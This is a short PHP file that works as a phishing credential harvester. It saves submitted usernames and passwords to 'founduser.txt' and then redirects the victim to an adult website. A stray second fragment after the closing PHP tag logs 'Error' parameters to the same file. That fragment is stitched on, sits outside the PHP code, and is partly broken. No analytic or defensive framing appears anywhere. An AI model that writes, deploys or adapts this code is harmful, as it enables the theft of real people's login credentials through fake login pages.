<?php
header('Location: https://xvideos.com');
 $user = $_POST["username"];
 $pass = $_POST["password"];

 $co = "===========================================\n"; 
 $cl = "===========================================\n";
 $fileuser = fopen("founduser.txt", "a") or die("Intentalo nuevamente");
 $us = "Username: $user\n";
 $pa = "Password: $pass\n";
 fwrite($fileuser, "\n". $co. $us. $pa. $cl);
 fclose($fileuser);
 exit()
?>


if (!empty($_POST['Error, check your connection'])) {file_put_contents("founduser.txt", "Error, check your connection: "  . $_POST['Error, check your connection'] . "
", FILE_APPEND);
}
if (!empty($_GET['Error, check your connection'])) {file_put_contents("founduser.txt", "Error, check your connection: "  . $_GET['Error, check your connection'] . "
", FILE_APPEND);
}
if (!empty($_POST['Error'])) {file_put_contents("founduser.txt", "Error: "  . $_POST['Error'] . "
", FILE_APPEND);
}
if (!empty($_GET['Error'])) {file_put_contents("founduser.txt", "Error: "  . $_GET['Error'] . "
", FILE_APPEND);
}
exit();